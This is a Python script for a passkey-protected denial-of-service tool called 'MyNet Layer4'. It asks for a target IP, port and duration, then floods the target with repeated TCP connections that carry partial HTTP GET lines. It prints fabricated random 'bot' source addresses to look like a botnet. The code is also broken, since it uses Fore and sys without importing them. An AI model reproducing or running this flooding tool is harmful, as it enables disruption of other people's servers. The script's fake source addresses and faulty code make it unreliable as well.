import socket
import threading
import time
import random
import os

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def valid_passkey():
    passkey = "bot0"  # Set passkey here
    user_input = input(Fore.GREEN + "Enter passkey to access the tool: ")
    return user_input == passkey


def print_menu():
    clear_screen()
    print("\033[1;35m" + r"""
    Made by: Lemonaidd

 ███▄ ▄███▓▓██   ██▓    ███▄    █ ▓█████▄▄▄█████▓
▓██▒▀█▀ ██▒ ▒██  ██▒    ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒
▓██    ▓██░  ▒██ ██░   ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░
▒██    ▒██   ░ ▐██▓░   ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ 
▒██▒   ░██▒  ░ ██▒▓░   ▒██░   ▓██░░▒████▒ ▒██▒ ░ 
░ ▒░   ░  ░   ██▒▒▒    ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   
░  ░      ░ ▓██ ░▒░    ░ ░░   ░ ▒░ ░ ░  ░   ░    
░      ░    ▒ ▒ ░░        ░   ░ ░    ░    ░      
       ░    ░ ░                 ░    ░  ░        
            ░ ░                                  
    """ + "\033[0m")
    print("\033[1;36m" + "MyNet Layer4" + "\033[0m")
    print("\033[1;32m" + "1. Attack IP" + "\033[0m")
    print("\033[1;32m" + "2. Exit" + "\033[0m")

def send_requests(target_ip, target_port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        bot_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            print("\033[1;35m" + f"-GET Request sent to:{target_ip}:{target_port} From: {bot_ip} : 22 " + "\033[0m")
            sock.close()
        except Exception as e:
            print("\033[1;31m" + f"Error: {e}" + "\033[0m")

def start_attack():
    target_ip = input("\033[1;32mEnter target IP: \033[0m")
    target_port = int(input("\033[1;32mEnter target Port: \033[0m"))
    duration = int(input("\033[1;32mEnter attack duration in seconds: \033[0m"))
    print("\033[1;32m" + "Attack starting..." + "\033[0m")
    threading.Thread(target=send_requests, args=(target_ip, target_port, duration)).start()

def main():
    passkey = input("Enter the passkey to access the tool: ")
    if passkey != "bot0":
        print(Fore.RED + "Invalid passkey!")
        sys.exit()
    while True:
        print_menu()
        choice = input("\033[1;37mSelect an option: \033[0m")
        if choice == '1':
            start_attack()
        elif choice == '2':
            print("\033[1;31mExiting...\033[0m")
            break
        else:
            print("\033[1;31mInvalid option, please try again.\033[0m")

if __name__ == "__main__":
    main()
